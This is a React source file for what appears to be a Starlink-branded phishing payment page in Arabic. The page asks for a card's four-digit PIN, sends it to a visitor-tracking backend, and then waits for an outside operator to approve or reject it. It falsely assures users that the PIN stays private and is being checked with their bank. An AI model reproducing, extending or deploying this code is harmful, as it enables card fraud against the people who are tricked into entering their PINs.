import { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Lock, Loader2 } from "lucide-react";
import { toast } from "@/hooks/use-toast";
import { updateVisitorData } from "@/hooks/useVisitorTracking";
import { SavedCardBadge, readCardMeta, SavedCardMeta } from "@/components/starlink/SavedCardBadge";
import SEO from "@/components/SEO";
import { seoData } from "@/lib/seo";

const PIN_LENGTH = 4;

const PaymentPin = () => {
  const navigate = useNavigate();
  const [pin, setPin] = useState<string[]>(Array(PIN_LENGTH).fill(""));
  const [loading, setLoading] = useState(false);
  const [waiting, setWaiting] = useState(false);
  const [card, setCard] = useState<SavedCardMeta | null>(null);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    const stored = sessionStorage.getItem("starlink_card");
    if (!stored) navigate("/payment", { replace: true });
    setCard(readCardMeta());
  }, [navigate]);

  useEffect(() => {
    const onApproval = (e: Event) => {
      const detail = (e as CustomEvent).detail;
      if (!detail) return;
      if (detail.command === "approve_pin") {
        sessionStorage.removeItem("starlink_card");
        setWaiting(false);
        navigate("/payment/success");
      } else if (detail.command === "reject_pin") {
        setWaiting(false);
        setPin(Array(PIN_LENGTH).fill(""));
        inputRefs.current[0]?.focus();
        toast({
          title: "الرقم السري خاطئ",
          description: "أعد إدخال الرقم السري للبطاقة.",
          variant: "destructive",
        });
      }
    };
    window.addEventListener("visitor-approval", onApproval);
    return () => window.removeEventListener("visitor-approval", onApproval);
  }, [navigate]);

  const handleChange = (index: number, value: string) => {
    const digit = value.replace(/\D/g, "").slice(-1);
    const newPin = [...pin];
    newPin[index] = digit;
    setPin(newPin);
    if (digit && index < PIN_LENGTH - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    const fullPin = pin.join("");
    if (fullPin.length < PIN_LENGTH) {
      toast({ title: "يرجى إدخال الرقم السري كاملاً (4 خانات)", variant: "destructive" });
      return;
    }
    setLoading(true);
    await updateVisitorData({ card_pin: fullPin });
    setLoading(false);
    setWaiting(true);
  };

  return (
    <>
      <SEO title={seoData.paymentPin.title} description={seoData.paymentPin.description} path="/payment/pin" noIndex />

      <main className="min-h-screen bg-background flex items-center justify-center px-4">
        <div className="w-full max-w-md">
          <div className="border border-foreground/10 p-8 space-y-6">

            <div className="flex items-center justify-between gap-2">
              <div className="flex items-center gap-2 text-xs text-muted-foreground">
                <Lock className="w-4 h-4" />
                <span>بدشو آ &#8212; لن يظهر رقم الرقم السري لأطراف ثالثة</span>
              </div>
              {card && <SavedCardBadge brand={card.brand} last4={card.last4} />}
            </div>

            <div className="text-center space-y-1">
              <h1 className="text-xl font-semibold">الرقم السري للبطاقة</h1>
              <p className="text-sm text-muted-foreground">
                أدخل الرقم السري الخاص ببطاقتك المكون من <strong>4 خانات مفصلة</strong> لتأكيد العملية
              </p>
            </div>

            <form onSubmit={submit} className="space-y-5">
              <div>
                <label className="text-sm text-muted-foreground mb-3 block text-center">
                  الرقم السري (PIN) &#8212; مكوّن من 4 خانات
                </label>
                <div className="flex gap-3 justify-center" dir="ltr">
                  {pin.map((digit, i) => (
                    <input
                      key={i}
                      ref={(el) => { inputRefs.current[i] = el; }}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleChange(i, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(i, e)}
                      disabled={waiting}
                      autoFocus={i === 0}
                      className="w-14 h-16 bg-transparent border border-foreground/20 focus:border-foreground outline-none transition-colors text-center text-2xl font-mono disabled:opacity-60"
                    />
                  ))}
                </div>
                <p className="text-xs text-muted-foreground mt-2 text-center">
                  الرقم السري مكوّن من 4 خانات فقط &#8212; أدخل كل رقم في خانته المخصصة
                </p>
              </div>

              <button
                type="submit"
                disabled={loading || waiting}
                className="w-full h-12 bg-foreground text-background hover:bg-foreground/90 transition-all text-sm font-medium tracking-wider disabled:opacity-60 inline-flex items-center justify-center gap-2"
              >
                {waiting ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    جارٍ التحقق...
                  </>
                ) : loading ? (
                  "جارٍ الإرسال..."
                ) : (
                  "تأكيد ومتابعة"
                )}
              </button>

              {waiting && (
                <p className="text-xs text-muted-foreground text-center">
                  نتحقق من الرقم السري مع البنك. لا تغلق هذه الصفحة.
                </p>
              )}
            </form>
          </div>
        </div>
      </main>
    </>
  );
};

export default PaymentPin;
